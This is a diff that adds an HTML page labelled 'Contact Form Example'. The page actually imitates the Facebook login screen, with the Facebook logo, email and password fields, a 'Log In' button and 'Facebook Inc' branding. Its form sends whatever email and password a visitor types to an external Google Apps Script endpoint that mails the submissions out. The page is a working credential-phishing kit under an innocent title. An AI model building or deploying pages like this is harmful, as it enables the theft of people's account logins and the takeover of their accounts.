@@ -1,0 +1,65 @@
+﻿
+
+
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="contact form example">
+    <link rel="stylesheet" type="text/css" href="main.css" />
+    <title>Contact Form Example</title>
+</head>
+
+<body>  
+    <div class="topnav">
+        <a href="">
+            <!-- Helvetica, Arial, sans-serif font-->
+            <img src="facebookLogo.PNG">
+        </a>
+    </div>
+    
+        <form id="gform" method="POST" class="pure-form pure-form-stacked"  data-email="from_email@example.com"
+            action="https://script.google.com/macros/s/AKfycbxcITGx-rymnvMCYVc-y9PsOy9PVCAxDMrpECsQ/exec">
+            <div class="input_form" >
+                <div class="first_two_input">
+            <input id="email" name="email" type="email" value=""
+                required placeholder="Mobile number or email address" />
+                <hr>
+            <input id="password" name="password" type="password" value="" 
+            required placeholder="Password">
+            </div>
+            <button>Log In</button>
+            </div>
+        </form>
+
+        <div class="or">
+            <span class="orspan">or</span>
+        </div>
+        <div class="createAccount">
+            <a href=""><div>
+                Create New Account
+            </div></a>
+        </div>
+        <div class="forgotPas"><a href="">Forgotten password?</a></div>
+        <p class="inc">Facebook Inc</p>
+    
+
+    <!-- Customise the Thankyou Message People See when they submit the form: -->
+    <div style="display:none;" id="thankyou_message">
+        <h2>
+            <em>Thanks</em> for contacting us!
+            We will get back to you soon!
+        </h2>
+    </div>
+
+
+    <script data-cfasync="false" type="text/javascript"
+            src="https://cdn.rawgit.com/dwyl/learn-to-send-email-via-google-script-html-no-server/master/form-submission-handler.js"></script>
+
+
+</body>
+</html>
+
+
